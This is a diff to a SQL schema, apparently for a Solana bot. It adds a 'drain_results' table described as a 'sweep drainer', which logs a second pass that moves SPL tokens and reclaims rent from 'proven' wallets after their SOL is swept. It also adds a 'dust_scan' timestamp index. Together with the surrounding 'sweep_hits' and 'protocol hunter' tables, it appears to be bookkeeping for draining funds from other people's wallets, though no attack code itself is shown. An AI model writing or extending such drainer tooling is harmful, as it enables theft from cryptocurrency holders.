@@ -734,6 +734,24 @@ CREATE TABLE IF NOT EXISTS sweep_hits (
 CREATE UNIQUE INDEX IF NOT EXISTS idx_sweep_hits_addr ON sweep_hits(address);
 CREATE INDEX IF NOT EXISTS idx_sweep_hits_spendable ON sweep_hits(spendable, swept);
 
+-- sweep drainer -------------------------------------------------------------
+-- The sweep takes lamports. This table records the SECOND pass: the SPL token
+-- accounts and rent the same proven wallet also owned. Keyed by address so a
+-- re-drain of the same wallet updates rather than accumulating rows.
+CREATE TABLE IF NOT EXISTS drain_results (
+  id            TEXT PRIMARY KEY,
+  ts            INTEGER NOT NULL,
+  address       TEXT NOT NULL,
+  accounts      INTEGER NOT NULL DEFAULT 0,
+  tokens_moved  INTEGER NOT NULL DEFAULT 0,
+  rent_only     INTEGER NOT NULL DEFAULT 0,
+  rent_lamports INTEGER NOT NULL DEFAULT 0,
+  live          INTEGER NOT NULL DEFAULT 0,
+  detail        TEXT NOT NULL DEFAULT ''
+);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_drain_results_addr ON drain_results(address);
+CREATE INDEX IF NOT EXISTS idx_drain_results_yield ON drain_results(tokens_moved DESC, rent_lamports DESC);
+
 -- ───────────────────────────────────────────────────────────── dust / rent ────
 -- Opening an SPL token account costs ~0.00203928 SOL in rent-exempt deposit and
 -- closing it returns that SOL. Most wallets never close empty accounts, so the
@@ -752,7 +770,10 @@ CREATE TABLE IF NOT EXISTS dust_scan (
 );
 CREATE UNIQUE INDEX IF NOT EXISTS idx_dust_acct ON dust_scan(token_account);
 CREATE INDEX IF NOT EXISTS idx_dust_closable ON dust_scan(closable, owner);
-
+-- /api/desk/dust reads this table on every poll. Without an index on `ts` that
+-- read scans a table that grows by every account the bot has ever seen, which is
+-- the shape that exhausts a free-tier D1 row budget.
+CREATE INDEX IF NOT EXISTS idx_dust_ts ON dust_scan(ts DESC);
 -- ────────────────────────────────────────────────────────── consultant ──
 -- The join between the protocol hunter and the hunt orchestrator.
 --
